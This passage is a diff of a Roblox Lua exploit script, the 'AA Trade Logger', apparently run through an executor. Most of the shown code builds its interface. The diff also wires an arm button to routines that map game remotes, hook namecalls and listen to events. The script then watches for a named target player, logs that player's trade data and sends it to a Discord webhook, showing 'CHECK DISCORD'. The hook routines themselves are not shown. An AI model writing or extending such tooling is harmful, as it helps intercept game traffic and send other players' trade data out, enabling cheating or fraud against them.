+TGL.Font=Enum.Font.Code; TGL.TextXAlignment=Enum.TextXAlignment.Left; TGL.Parent=TGF
+
+-- status box
+local statBg=Instance.new("Frame")
+statBg.Size=UDim2.new(1,-20,0,54); statBg.Position=UDim2.new(0,10,0,120)
+statBg.BackgroundColor3=Color3.fromRGB(10,10,22); statBg.BorderSizePixel=0; statBg.Parent=Main
+Instance.new("UICorner",statBg).CornerRadius=UDim.new(0,4)
+Instance.new("UIStroke",statBg).Color=Color3.fromRGB(35,35,120)
+
+local mainStatus=Instance.new("TextLabel")
+mainStatus.Size=UDim2.new(1,-10,0.5,0); mainStatus.Position=UDim2.new(0,6,0,2)
+mainStatus.BackgroundTransparency=1; mainStatus.Text="idle"
+mainStatus.TextColor3=Color3.fromRGB(100,100,160); mainStatus.TextSize=12
+mainStatus.Font=Enum.Font.GothamBold; mainStatus.TextXAlignment=Enum.TextXAlignment.Left
+mainStatus.Parent=statBg
+
+local subStatus=Instance.new("TextLabel")
+subStatus.Size=UDim2.new(1,-10,0.5,0); subStatus.Position=UDim2.new(0,6,0.5,0)
+subStatus.BackgroundTransparency=1; subStatus.Text="arm → trade manually → auto-logs on accept"
+subStatus.TextColor3=Color3.fromRGB(80,80,130); subStatus.TextSize=10
+subStatus.Font=Enum.Font.Code; subStatus.TextXAlignment=Enum.TextXAlignment.Left
+subStatus.Parent=statBg
+
+local function setMain(msg, col)
+    mainStatus.Text=msg
+    mainStatus.TextColor3=col or Color3.fromRGB(80,205,100)
+end
+
+local function setSub(msg)
+    subStatus.Text=msg
+    subStatus.TextColor3=Color3.fromRGB(80,80,130)
+end
 
 -- counters
-local function mkCounter(lbl, x, y, w)
+local function mkCnt(lbl, x, y, w)
     local F=Instance.new("Frame")
-    F.Size=UDim2.new(0,w,0,36); F.Position=UDim2.new(0,x,0,y)
+    F.Size=UDim2.new(0,w,0,34); F.Position=UDim2.new(0,x,0,y)
     F.BackgroundColor3=Color3.fromRGB(10,10,24); F.BorderSizePixel=0; F.Parent=Main
     Instance.new("UICorner",F).CornerRadius=UDim.new(0,4)
     local NL=Instance.new("TextLabel")
     NL.Size=UDim2.new(1,0,0.55,0); NL.BackgroundTransparency=1
-    NL.Text="0"; NL.TextColor3=Color3.fromRGB(80,210,120)
-    NL.TextSize=15; NL.Font=Enum.Font.GothamBold; NL.Parent=F
+    NL.Text="0"; NL.TextColor3=Color3.fromRGB(80,205,120)
+    NL.TextSize=14; NL.Font=Enum.Font.GothamBold; NL.Parent=F
     local LL=Instance.new("TextLabel")
     LL.Size=UDim2.new(1,0,0.45,0); LL.Position=UDim2.new(0,0,0.55,0)
     LL.BackgroundTransparency=1; LL.Text=lbl
-    LL.TextColor3=Color3.fromRGB(75,75,130); LL.TextSize=9; LL.Font=Enum.Font.Code; LL.Parent=F
+    LL.TextColor3=Color3.fromRGB(70,70,125); LL.TextSize=9; LL.Font=Enum.Font.Code; LL.Parent=F
     return NL
 end
 
-local c_kwR  = mkCounter("⚡ remotes",  10, 128, 65)
-local c_invH = mkCounter("⚡ rf hits",  80, 128, 65)
-local c_kwE  = mkCounter("⚡ events",  150, 128, 65)
-local c_ncH  = mkCounter("⚡ nc hits", 220, 128, 65)
+local c1=mkCnt("⚡ nc hits",  10, 183, 65)
+local c2=mkCnt("⚡ events",   80, 183, 65)
+local c3=mkCnt("rf hits",    150, 183, 65)
+local c4=mkCnt("all calls",  220, 183, 65)
 
 task.spawn(function()
     while SG.Parent do
-        c_kwR.Text  = tostring(#LOG.kwRemotes)
-        c_invH.Text = tostring(#LOG.invokeHits)
-        c_kwE.Text  = tostring(#LOG.kwEvents)
-        c_ncH.Text  = tostring(#LOG.ncHits)
+        c1.Text=tostring(#LOG.ncHits)
+        c2.Text=tostring(#LOG.kwEvents)
+        c3.Text=tostring(#LOG.invokeHits)
+        c4.Text=tostring(#LOG.ncFull)
         task.wait(1)
     end
 end)
 
--- phases
-local phases = {
-    {lbl="1 · Remote Map",         key="map"},
-    {lbl="2 · Targeted RF Invoke", key="invoke"},
-    {lbl="3 · Event Listeners",    key="events"},
-    {lbl="4 · Namecall Hook",      key="nc"},
-    {lbl="5 · Index Hook",         key="idx"},
-    {lbl="6 · Instance Scan",      key="scan"},
-}
+-- trade sent indicator
+local sentInd=Instance.new("Frame")
+sentInd.Size=UDim2.new(1,-20,0,20); sentInd.Position=UDim2.new(0,10,0,225)
+sentInd.BackgroundColor3=Color3.fromRGB(10,10,22); sentInd.BorderSizePixel=0
+sentInd.Visible=false; sentInd.Parent=Main
+Instance.new("UICorner",sentInd).CornerRadius=UDim.new(0,4)
 
-local phaseUI = {}
-for i, p in ipairs(phases) do
-    local row=Instance.new("Frame")
-    row.Size=UDim2.new(1,-20,0,15); row.Position=UDim2.new(0,10,0,172+(i-1)*17)
-    row.BackgroundTransparency=1; row.Parent=Main
+local sentLbl=Instance.new("TextLabel")
+sentLbl.Size=UDim2.new(1,0,1,0); sentLbl.BackgroundTransparency=1
+sentLbl.Text="⚡ TRADE AUTO-LOGGED — CHECK DISCORD"
+sentLbl.TextColor3=Color3.fromRGB(255,220,50); sentLbl.TextSize=11
+sentLbl.Font=Enum.Font.GothamBold; sentLbl.Parent=sentInd
 
-    local dot=Instance.new("Frame")
-    dot.Size=UDim2.new(0,7,0,7); dot.Position=UDim2.new(0,0,0.5,-3.5)
-    dot.BackgroundColor3=Color3.fromRGB(50,50,70); dot.BorderSizePixel=0; dot.Parent=row
-    Instance.new("UICorner",dot).CornerRadius=UDim.new(0,4)
-
-    local lbl2=Instance.new("TextLabel")
-    lbl2.Size=UDim2.new(1,-14,1,0); lbl2.Position=UDim2.new(0,12,0,0)
-    lbl2.BackgroundTransparency=1; lbl2.Text=p.lbl
-    lbl2.TextColor3=Color3.fromRGB(90,90,135); lbl2.TextSize=10
-    lbl2.Font=Enum.Font.Code; lbl2.TextXAlignment=Enum.TextXAlignment.Left; lbl2.Parent=row
-
-    phaseUI[p.key]={dot=dot,lbl=lbl2}
-end
-
-local function setPhase(key, state)
-    local ref = phaseUI[key]
-    if not ref then return end
-    if state == "run" then
-        ref.dot.BackgroundColor3=Color3.fromRGB(230,170,20)
-        ref.lbl.TextColor3=Color3.fromRGB(230,170,20)
-    elseif state == "done" then
-        ref.dot.BackgroundColor3=Color3.fromRGB(40,195,80)
-        ref.lbl.TextColor3=Color3.fromRGB(40,195,80)
-    end
-end
-
--- status
-local SL=Instance.new("TextLabel")
-SL.Size=UDim2.new(1,-20,0,12); SL.Position=UDim2.new(0,10,0,278)
-SL.BackgroundTransparency=1; SL.Text="paste webhook → arm → open inventory/trade → send"
-SL.TextColor3=Color3.fromRGB(90,90,135); SL.TextSize=10
-SL.Font=Enum.Font.Code; SL.TextXAlignment=Enum.TextXAlignment.Left; SL.Parent=Main
-
-local function setStat(msg, good)
-    SL.Text=msg
-    SL.TextColor3=good==false and Color3.fromRGB(230,60,60) or Color3.fromRGB(55,200,95)
-end
-
--- buttons
+-- arm button
 local armed = false
 
 local ArmBtn=Instance.new("TextButton")
-ArmBtn.Size=UDim2.new(0,130,0,28); ArmBtn.Position=UDim2.new(0,10,0,296)
-ArmBtn.BackgroundColor3=Color3.fromRGB(25,25,150); ArmBtn.Text="[ ARM ]"
-ArmBtn.TextColor3=Color3.fromRGB(170,170,255); ArmBtn.TextSize=11
+ArmBtn.Size=UDim2.new(1,-20,0,32); ArmBtn.Position=UDim2.new(0,10,0,254)
+ArmBtn.BackgroundColor3=Color3.fromRGB(25,25,150); ArmBtn.Text="[ ARM — WATCH FOR TRADE ]"
+ArmBtn.TextColor3=Color3.fromRGB(170,170,255); ArmBtn.TextSize=12
 ArmBtn.Font=Enum.Font.GothamBold; ArmBtn.BorderSizePixel=0; ArmBtn.Parent=Main
-Instance.new("UICorner",ArmBtn).CornerRadius=UDim.new(0,5)
+Instance.new("UICorner",ArmBtn).CornerRadius=UDim.new(0,6)
 
-local SendBtn=Instance.new("TextButton")
-SendBtn.Size=UDim2.new(0,145,0,28); SendBtn.Position=UDim2.new(0,150,0,296)
-SendBtn.BackgroundColor3=Color3.fromRGB(18,95,38); SendBtn.Text="[ SEND REPORTS ]"
-SendBtn.TextColor3=Color3.fromRGB(150,255,150); SendBtn.TextSize=11
-SendBtn.Font=Enum.Font.GothamBold; SendBtn.BorderSizePixel=0; SendBtn.Parent=Main
-Instance.new("UICorner",SendBtn).CornerRadius=UDim.new(0,5)
+-- reset button (in case you want to do another trade)
+local ResetBtn=Instance.new("TextButton")
+ResetBtn.Size=UDim2.new(1,-20,0,22); ResetBtn.Position=UDim2.new(0,10,0,292)
+ResetBtn.BackgroundColor3=Color3.fromRGB(80,30,10); ResetBtn.Text="[ RESET FOR NEW TRADE ]"
+ResetBtn.TextColor3=Color3.fromRGB(255,180,100); ResetBtn.TextSize=10
+ResetBtn.Font=Enum.Font.GothamBold; ResetBtn.BorderSizePixel=0; ResetBtn.Parent=Main
+Instance.new("UICorner",ResetBtn).CornerRadius=UDim.new(0,5)
 
 ArmBtn.MouseButton1Click:Connect(function()
-    if armed then setStat("already armed ✓", true); return end
-    local wh=WHB.Text
+    if armed then setMain("already armed ✓"); return end
+
+    local wh = WHB.Text
     if not wh:find("discord.com/api/webhooks") then
-        setStat("set webhook first", false); return
+        setMain("set webhook first", Color3.fromRGB(230,60,60)); return
     end
-    armed=true
-    ArmBtn.Text="[ ARMED ✓ ]"
+    WEBHOOK = wh
+    armed = true
+    ArmBtn.Text="[ ARMED — WAITING FOR TRADE ]"
     ArmBtn.BackgroundColor3=Color3.fromRGB(10,55,10)
 
     task.spawn(function()
-        setPhase("map","run"); setStat("phase 1 — mapping remotes...", true)
-        mapRemotes(); setPhase("map","done")
+        setMain("scanning...", Color3.fromRGB(230,170,30))
+        setSub("mapping remotes + arming hooks")
+        scanInstances()
+        armNamecall()
+        listenEvents()
 
-        setPhase("invoke","run"); setStat("phase 2 — invoking keyword RFs...", true)
-        invokeRemotes(); task.wait(3); setPhase("invoke","done")
+        setMain("armed ✓", Color3.fromRGB(50,210,90))
+        setSub("build your trade manually → it auto-logs when "..TARGET_NAME.." accepts")
 
-        setPhase("events","run"); setStat("phase 3 — listening events (45s)...", true)
-        listenEvents(); setPhase("events","done")
-
-        setPhase("nc","run"); setStat("phase 4 — namecall hook...", true)
-        armNamecall(); setPhase("nc","done")
-
-        setPhase("idx","run"); setStat("phase 5 — index hook...", true)
-        armIndex(); setPhase("idx","done")
-
-        setPhase("scan","run"); setStat("phase 6 — scanning instances...", true)
-        scanInstances(); setPhase("scan","done")
-
-        setStat("armed ✓ — open inventory, tap units, try a trade → then SEND", true)
+        -- watch for target in server
+        task.spawn(function()
+            local targetPlayer = watchTarget()
+            if targetPlayer then
+                setMain("target online ✓", Color3.fromRGB(50,210,90))
+                setSub(TARGET_NAME.." is in server — ready")
+            end
+        end)
     end)
 end)
 
-SendBtn.MouseButton1Click:Connect(function()
-    local wh=WHB.Text
-    if not wh:find("discord.com/api/webhooks") then
-        setStat("invalid webhook", false); return
+ResetBtn.MouseButton1Click:Connect(function()
+    -- clear logs for new trade
+    LOG.tradeData    = {}
+    LOG.ncHits       = {}
+    LOG.ncFull       = {}
+    LOG.kwEvents     = {}
+    LOG.invokeHits   = {}
+    LOG.acceptEvent  = nil
+    LOG.confirmEvent = nil
+    tradeSent        = false
+    tradeActive      = false
+    sentInd.Visible  = false
+    setMain("reset ✓ — ready for new trade", Color3.fromRGB(50,210,90))
+    setSub("logs cleared — arm hooks still active")
+    print("[igc] logs reset for new trade session")
+end)
+
+-- hook auto-show sent indicator
+task.spawn(function()
+    while SG.Parent do
+        if tradeSent and not sentInd.Visible then
+            sentInd.Visible = true
+            setMain("⚡ LOGGED — CHECK DISCORD", Color3.fromRGB(255,220,50))
+            setSub("reset for another trade if needed")
+        end
+        task.wait(0.5)
     end
-    setStat("sending 10 reports...", true)
-    SendBtn.Text="[ SENDING... ]"
-    SendBtn.BackgroundColor3=Color3.fromRGB(10,50,10)
-    task.spawn(function()
-        buildReports(wh)
-        setStat("done ✓ — paste output back to igc", true)
-        SendBtn.Text="[ SEND REPORTS ]"
-        SendBtn.BackgroundColor3=Color3.fromRGB(18,95,38)
-    end)
 end)
 
-print("[igc] AA Logger v3 loaded on "..EXEC.." — keywords: "..table.concat(KEYWORDS,", "))
+print("[igc] AA Trade Logger loaded — target: "..TARGET_NAME.." — arm and trade manually")
